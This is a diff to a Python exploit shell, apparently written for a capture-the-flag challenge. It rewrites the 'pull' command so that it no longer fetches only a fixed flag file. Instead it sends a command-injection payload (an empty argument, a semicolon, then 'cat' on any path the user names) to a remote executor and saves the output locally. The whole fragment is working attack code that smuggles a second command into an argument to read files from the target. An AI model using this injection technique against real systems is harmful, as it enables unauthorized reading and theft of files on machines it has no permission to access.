@@ -56,8 +56,11 @@ if __name__ == '__main__':
 			break
 		elif command == "help":
 			print("Help menu\n shell: allows you to use interactive shell \n pull: allows you to download files \n help: shows this menu \n quit: quit the shell")
-		elif command == "pull":
-			execute_cmd(" \"\" ; pull /home/flag.txt downloaded_flag.txt")
+		elif command.split()[0] == "pull":
+			original = sys.stdout
+			sys.stdout = open(command.split()[2],'w')
+			execute_cmd(" \"\" ; cat " + command.split()[1] + "\n")
+			sys.stdout = original
 		else:
 			print("Help menu\n shell: allows you to use interactive shell \n pull: allows you to download files \n help: shows this menu \n quit: quit the shell")
 
